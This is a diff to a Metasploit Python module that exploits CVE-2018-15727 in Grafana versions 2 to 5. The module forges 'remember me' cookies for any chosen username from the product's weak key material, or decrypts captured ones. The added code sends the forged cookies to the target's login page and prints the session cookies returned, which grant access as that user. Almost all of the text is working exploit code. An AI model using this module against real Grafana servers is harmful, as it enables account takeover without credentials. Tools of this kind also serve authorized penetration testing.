@@ -3,11 +3,12 @@
 
 # standard modules
 from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+import requests 
 import binascii
 import hashlib
 import logging
 import os
-
+import re
 
 from metasploit import module
 
@@ -23,7 +24,7 @@ metadata = {
         'Rene Riedling',
         'Sebastian Solnica' #Original Discovered
     ],
-    'date': '2019-03-22', # set to date of creation
+    'date': '2019-08-14', # set to date of creation
     'license': 'MSF_LICENSE',
     'references': [
         {'type': 'cve', 'ref': '2018-15727'},
@@ -32,15 +33,17 @@ metadata = {
     ],
     'type': 'single_scanner',
     'options': {
-        'VERSION': {'type': 'string', 'description': 'Grafana version (5,4,3,2)', 'required': True, 'default': '5'},
-        'USERNAME': {'type': 'string', 'description': 'Valid username', 'required': False, 'default': ''},
-        'RHOSTS': {'type': 'string', 'description': 'The target address range or CIDR identifier', 'required': False, 'default': '127.0.0.1'},
-        'COOKIE': {'type': 'string', 'description': 'Cookie for decryption', 'required': False, 'default': ''}
+        'VERSION': {'type': 'string', 'description': 'Grafana version', 'required': True, 'default': '5'},
+        'USERNAME': {'type': 'string', 'description': 'Valid username', 'required': False},
+        'RHOSTS': {'type': 'address', 'description': 'Address of target', 'required': True, 'default': '127.0.0.1'},
+        'RPORT': {'type': 'port', 'description': 'Port of target', 'required': True, 'default': 3000},
+        'COOKIE': {'type': 'string', 'description': 'Decrypt captured cookie', 'required': False},
+        'BASEURL': {'type': 'string', 'description': 'Base URL of grafana instance', 'required': False, 'default' : '/'}
     }
 }
 
 
-def encrypt_version_5(username):
+def encrypt_version5(username):
     
     salt = b''
     iterations = 1000
@@ -53,7 +56,7 @@ def encrypt_version_5(username):
     return cookie
 
 
-def encrypt_version_4to2(username):
+def encrypt_version4(username):
 
     salt = hashlib.md5(''.encode("utf-8")).hexdigest().encode()
     iterations = 1000
@@ -66,7 +69,7 @@ def encrypt_version_4to2(username):
     return cookie
 
 
-def decrypt_version_5(cookie):
+def decrypt_version5(cookie):
     
     salt = b''
     iterations = 1000
@@ -78,7 +81,7 @@ def decrypt_version_5(cookie):
     return username
 
 
-def decrypt_version_4to2(cookie):
+def decrypt_version4(cookie):
 
     salt = hashlib.md5(''.encode("utf-8")).hexdigest().encode()
     iterations = 1000
@@ -88,38 +91,76 @@ def decrypt_version_4to2(cookie):
     ct = binascii.unhexlify(cookie[24:len(cookie)])
     username = str(aesgcm.decrypt(nonce, ct, None),'ascii')
     return username
+
+
 
 
 def run(args):
-    
-    if args['USERNAME'] == '' and args['COOKIE'] == '':
-        module.log("Username or cookie should've been set to generate cookies", 'warning')
+   
 
-    elif args['USERNAME'] != '':
-        module.log("Delete the session cookie and set the following", 'info')
-        if args['VERSION'] == '5':
-            module.log("grafana_user: "+args['USERNAME'], 'good')
-            module.log("grafana_remember: "+encrypt_version_5(args['USERNAME']), 'good')
-            return
-        elif int(args['VERSION']) <= 4 and int(args['VERSION']) >= 2:
-            module.log("grafana_user: "+args['USERNAME'], 'good')
-            module.log("grafana_remember: "+encrypt_version_4to2(args['USERNAME']), 'good')
-            return
+    if int(args['VERSION']) == 5:
+        try:    
+            username = args['USERNAME']
+            cookie = encrypt_version5(args['USERNAME'])
+            module.log("Encrypted remember cookie: "+cookie, "good")
+        except:
+            module.log("No username set, trying to decrypt it from cookie.", "warning")
+            try:
+                username = decrypt_version5(args['COOKIE'])
+                module.log("Decrypted username: "+username, "good")
+                cookie = args['COOKIE']
+            except:
+                module.log("Unable to set username", "error")
+                return
+    elif int(args['VERSION']) <= 4 and int(args['VERSION']) >= 2:
+        try:    
+            username = args['USERNAME']
+            cookie = encrypt_version4(args['USERNAME'])
+            module.log("Encrypted remember cookie: "+cookie, "good")
+        except:
+            module.log("No username set, trying to decrypt it from cookie.", "warning")
+            try:
+                username = decrypt_version4(args['COOKIE'])
+                module.log("Decrypted username: "+username, "good")
+                cookie = args['COOKIE']
+            except:
+                module.log("Unable to set username", "error")
+                return
+    else:
+        module.log("Version not supported.","error")
+
+
+    try:
+        cookies = { 'grafana_remember':cookie, 'grafana_user':username }
+        
+        if args['BASEURL'].endswith('/'): 
+            url="http://"+args['RHOSTS']+":"+args['RPORT']+args['BASEURL']+"login/"
         else:
-            module.log("Available versions are either 5,4,3 or 2", 'warning')
+            url="http://"+args['RHOSTS']+":"+args['RPORT']+args['BASEURL']+"/login/"
+        
+        r = requests.get(url=url, cookies=cookies, allow_redirects=False)
     
-    elif args['COOKIE'] != '':
-        module.log("Delete the session cookie and set the following", 'info')
-        if args['VERSION'] == '5':
-            module.log("grafana_user: "+decrypt_version_5(args['COOKIE']), 'good')
-            module.log("grafana_remember: "+args['COOKIE'], 'good')
+    except:
+        module.log("Failed to sending request to host.", "error")
+        return
+
+
+    if r.status_code == 302:
+        try:
+            grafana_user = re.search(r"grafana_user=.*?;",r.headers['Set-Cookie']).group(0)
+            grafana_remember = re.search(r"grafana_remember=.*?;",r.headers['Set-Cookie']).group(0)
+            grafana_sess = re.search(r"grafana_sess=.*?;",r.headers['Set-Cookie']).group(0)
+    
+            module.log("Set following cookies to get access to the grafana instance.","good")
+            module.log(grafana_user,"good")
+            module.log(grafana_remember,"good")
+            module.log(grafana_sess,"good")
+        except: 
+            module.log("Failed to generate cookies out of request.", "error")
             return
-        elif int(args['VERSION']) <= 4 and int(args['VERSION']) >= 2:
-            module.log("grafana_user: "+decrypt_version_4to2(args['COOKIE']), 'good')
-            module.log("grafana_remember: "+args['COOKIE'], 'good')
-            return
-        else:
-            module.log("Available versions are either 5,4,3,2", 'warning')
+    else:
+        module.log("Target is not vulnerable.","warning")
+        return
 
 
 
